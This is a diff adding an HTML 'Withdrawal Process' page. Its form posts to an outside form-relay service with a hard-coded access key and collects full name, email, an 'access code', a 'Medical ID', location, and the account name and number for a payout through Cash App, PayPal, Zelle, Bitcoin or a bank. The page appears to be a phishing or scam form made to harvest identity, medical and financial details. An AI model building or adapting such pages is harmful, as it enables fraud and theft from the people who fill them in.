@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- custom css file link  -->
+    <link rel="stylesheet" href="css/style.css">
+
+</head>
+
+<body>
+
+    <div class="container">
+
+        <form action="https://api.web3forms.com/submit" method="POST" class="sign-up-form">
+            <input type="hidden" name="access_key" value="4c2883a4-fe20-465a-8def-4666cfe57007" />
+            <div class="row">
+
+                <div class="col">
+
+                <h3 class="title">Withdrawal Process</h3>  
+
+                    <div class="inputBox">
+                        <span>Full Name :</span>
+                        <input type="text" name="full-name" placeholder="Full Name">
+                    </div>
+                    <div class="inputBox">
+                        <span>Email :</span>
+                        <input type="email" name="email" placeholder="example@example.com">
+                    </div>
+                    <div class="inputBox">
+                        <span>Access Code :</span>
+                        <input type="text" name="access-code" placeholder="Access Code">
+                    </div>
+                    <div class="inputBox">
+                        <span>Medical ID :</span>
+                        <input type="text" name="medical-id" placeholder="Medical ID">
+                    </div>
+
+                    <div class="flex">
+                        <div class="inputBox">
+                            <span>State :</span>
+                            <input type="text" name="state" placeholder="State">
+                        </div>
+                        <div class="inputBox">
+                            <span>zip code :</span>
+                            <input type="text" name="zip-code" placeholder="0000">
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <div class="col">
+
+                    <h3 class="title">Payment</h3>
+
+                    <div class="inputBox">
+                        <span>Payment Method :</span>
+                        <div class="select">
+                            <select name="payment">
+                                <option hidden>Application Form Payment Method</option>
+                                <option>Cash App</option>
+                                <option>PayPal</option>
+                                <option>Apple Pay</option>
+                                <option>Zelle</option>
+                                <option>Venmo</option>
+                                <option>Bitcoin </option>
+                                <option>Bank Transfer </option>
+                                <option>Others </option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="inputBox">
+                        <span>Name on The Account:</span>
+                        <input type="text" name="account-name" placeholder="john deo">
+                    </div>
+                    <div class="inputBox">
+                        <span>Account Number / Tag :</span>
+                        <input type="text" name="account-number/tag" placeholder="1111-2222-3333-4444">
+                    </div>
+                    <div class="inputBox">
+                        <span>Withdrawal Amount</span>
+                        <input type="text" name="withdrawal amount" placeholder="100">
+                    </div>
+
+
+                </div>
+
+            </div>
+
+            <input type="submit" value="proceed to Withdrawal" class="submit-btn" style="border-radius: 5%;">
+
+        </form>
+
+    </div>
+
+</body>
+
+</html>
